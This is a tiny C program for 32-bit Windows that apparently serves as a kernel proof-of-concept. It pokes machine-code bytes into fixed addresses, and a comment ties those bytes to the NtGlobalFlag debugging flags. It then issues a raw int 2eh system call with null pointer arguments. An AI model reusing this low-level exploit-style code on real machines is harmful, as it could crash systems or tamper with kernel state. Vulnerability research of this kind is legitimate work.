void* a[2];

void main(void){
	int i;  for (i=0;i<2;i++) a[i]=(void*)0;
  *(char*)(0x4080a4)=0x80; //or bptr [NtGlobalFlag+2],c1h
  *(char*)(0x4080a5)=0x0d;
  *(char*)(0x4080a6)=0xb6;
  *(char*)(0x4080a7)=0xc2;
  *(char*)(0x4080a8)=0x14;
  *(char*)(0x4080a9)=0x80;
  *(char*)(0x4080aa)=0xc1;
  *(char*)(0x4080ab)=0xcf;

  _asm  {  mov eax,4346
	       mov edx,offset a
		   int 2eh
		}
}